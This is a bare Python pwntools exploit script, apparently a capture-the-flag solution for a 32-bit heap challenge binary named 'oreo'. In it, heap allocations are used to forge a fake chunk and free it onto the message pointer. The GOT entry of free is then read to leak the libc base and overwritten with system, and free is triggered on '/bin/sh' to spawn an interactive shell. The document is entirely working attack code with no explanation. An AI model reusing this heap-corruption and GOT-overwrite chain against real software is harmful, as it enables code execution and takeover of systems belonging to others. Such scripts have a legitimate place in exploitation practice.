from pwn import *

r = process('./oreo')
e = ELF('./oreo')
libc = e.libc
context.arch = 'i386'
msg = 0x0804A2A8
sscanf = 0x804a258
ret = 0x08048436 # : ret

def new(name, des):
    r.sendline('1')
    r.sendline(name)
    r.sendline(des)
def show():
    r.sendline('2')
def order():
    r.sendline('3')
def leave_msg(msg):
    r.sendline('4')
    r.sendline(msg)
def status():
    r.sendline('5')

for i in range(0x40):
    new('A', '')

# overwrite msg to free
leave_msg('\x00'*0x20+p32(0x40)+p32(0x100))
new('A'*0x1b+p32(msg), '')
order()
new('', p32(e.got['free']))

# leak libc
status()
r.recvuntil('Order Message: ')
free = u32(r.recv(4))
libc_base = free - libc.symbols['free']
log.info('libc base: %#x' % libc_base)

# overwrite free
system = libc_base + libc.symbols['system']
sh = libc_base + libc.search('/bin/sh\x00').next()
new('A'*0x1b+p32(sh), '')
leave_msg(p32(system)+p32(0x08048486))

# launch shell
r.clean()
order()

r.interactive()
